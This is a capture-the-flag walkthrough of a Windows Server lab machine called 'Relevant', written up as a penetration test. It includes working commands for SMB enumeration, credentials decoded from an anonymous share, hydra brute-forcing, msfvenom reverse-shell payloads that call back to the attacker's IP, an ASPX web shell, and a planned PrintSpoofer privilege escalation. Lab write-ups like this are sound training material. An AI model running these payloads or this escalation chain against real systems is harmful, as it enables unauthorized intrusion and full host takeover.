# Relevant

## Pre-Engagement Briefing

- Engagement type: black-box penetration test.
- Target: a provided virtual environment due to be released to production in seven days.
- Objective: obtain two proof-of-exploitation flags:
  - `user.txt`
  - `root.txt`

## Scope of Work

- Minimal initial information is provided to simulate a malicious actor's perspective.
- Scope allowances:
  - Any tools or techniques are permitted.
  - Manual exploitation should be attempted first.
  - Locate and note all vulnerabilities found.
  - Submit discovered flags to the dashboard.
  - Only the assigned IP address is in scope.
  - Find and report all vulnerabilities; more than one path to root may exist.

## Reporting Practice Note

- Treat the challenge like a real penetration test.
- A useful final report would include:
  - Executive summary
  - Vulnerability and exploitation assessment
  - Remediation suggestions

## Step 1: Scanning

### Command

```bash
nmap -Pn -sV -sC 10.10.116.204 -oN nmap1.txt
```

### Key Findings

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

### Notable Security Observations

- HTTP server: Microsoft IIS `10.0`
- Potentially risky HTTP method:
  - `TRACE`
- SMB host details:
  - OS: Windows Server 2016 Standard Evaluation `14393`
  - Computer name: `Relevant`
  - Workgroup: `WORKGROUP`
- SMB security:
  - Message signing enabled but not required.
  - This can be dangerous because it may permit relay-style attacks in some environments.

## Step 2: Directory Enumeration

```bash
dirb http://10.10.116.204 /usr/share/wordlists/dirb/common.txt 2>/dev/null
```

- Result: no useful findings.

## Step 3: SMB Share Listing

```bash
smbclient -L 10.10.191.196
```

### Shares Discovered

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

## Step 4: Additional SMB Enumeration

```bash
enum4linux -UrGS 10.10.83.252
```

- Result: no useful value.

## Step 5: Anonymous SMB Access

### Connection Format

```bash
smbclient //10.10.83.252/nt4wrksv -U " "%" "
```

- SMB connection format:

```text
//host/share -U <username>%<password>
```

### Findings

- Anonymous login worked.
- File discovered:
  - `passwords.txt`
- Base64-encoded contents:

```text
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

### Decoded Credentials

- `Bob - !P@$$W0rD!123`
- `Bill - Juw4nnaM4n420696969!$$$`

## Step 6: Test SMB Credentials

```bash
smbclient //10.10.83.252/nt4wrksv -U <bill-or-bob>
```

- Connections worked but did not reveal additional useful data.
- Other shares were not accessible.

## Step 7: Validate Credentials with Hydra

```bash
hydra -t 1 -V -f -L usernames.txt -P passwords.txt 10.10.200.199 smb
```

### Result

```text
[445][smb] host: 10.10.200.199   login: Bob   password: !P@$$W0rD!123
```

- Valid user: `Bob`
- `Bill` did not appear to be a valid user.

## Step 8: Full Port Scan

### Question During Investigation

What did I miss?

### Command

```bash
nmap -Pn -sV -p- 10.10.200.199
```

### Additional Ports Found

```text
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

- Important new attack surface:
  - HTTP on port `49663`

## Step 9: RDP Attempt

- Tried to authenticate to RDP on port `3389` with `xfreerdp`.
- The attempt was unsuccessful.
- This did not conclusively prove RDP was unusable, but it was not the immediate path forward.

## Step 10: Directory Enumeration on Port 49663

```bash
dirb http://10.10.92.149:49663 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2>/dev/null
```

- Added exposed share names to `smblist.txt` and retried enumeration.
- Directory discovered:
  - `/nt4wrksv`

## Step 11: Confirm Writable SMB Share

```bash
smbclient //10.10.83.252/nt4wrksv -U " "%" "
put passwords.txt
```

- Upload succeeded.
- Operational finding:
  - The SMB share is writable.
  - The writable share is also exposed through IIS on port `49663`.

## Step 12: Reverse Shell Attempts

### Initial Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.2.29.130 LPORT=4545 \
  -e x86/shikata_ga_nai -f exe -o relevantsetup.exe
```

- Uploaded the executable to `nt4wrksv`.
- Also copied a PHP web shell for testing.
- Started a Netcat listener.
- These attempts did not produce the expected shell.

### ASPX Web Shell

- Uploaded an ASPX web shell from the webshells directory.
- Called the web shell through port `49663`.
- Web shell context:

```text
c:\windows\system32\inetsrv
```

- Navigation was limited.
- Initial attempt marked as failure.

## Step 13: Determine Architecture

- Use the web shell to run:

```cmd
echo %PROCESSOR_ARCHITECTURE%
```

- Result:
  - `AMD64`

## Step 14: Generate x64 ASPX Payload

### Search Payloads

```bash
msfvenom --list all | grep windows | grep x64 | grep -v powershell | \
  grep reverse_tcp | grep -v http | grep -v python | grep -v tftp | \
  grep -v vncinject | grep -v peinject
```

### New Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.29.130 LPORT=5000 \
  -a x64 -f aspx -o relevant8.aspx
```

- Trigger payload:

```bash
curl http://10.10.115.131:49663/nt4wrksv/relevant8.aspx
```

- Result:
  - Reverse connection received.

## Step 15: Check Privileges

```cmd
whoami /priv
```

### Privileges Observed

```text
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Operational Significance

- `SeImpersonatePrivilege` is enabled.
- This is a common privilege escalation path on Windows web-service contexts.

## Step 16: Employ PrintSpoofer

### Attacker Machine

```bash
git clone https://github.com/dievus/printspoofer.git
```

- Place `PrintSpoofer.exe` in the same directory used for SMB upload.

### SMB Upload

```smb
put PrintSpoofer.exe
```

### Reverse Shell

```cmd
cd c:\inetpub\wwwroot\nt4wrksv
```

- The remaining exploitation path is to run PrintSpoofer from the writable web directory to abuse `SeImpersonatePrivilege` and obtain elevated execution.
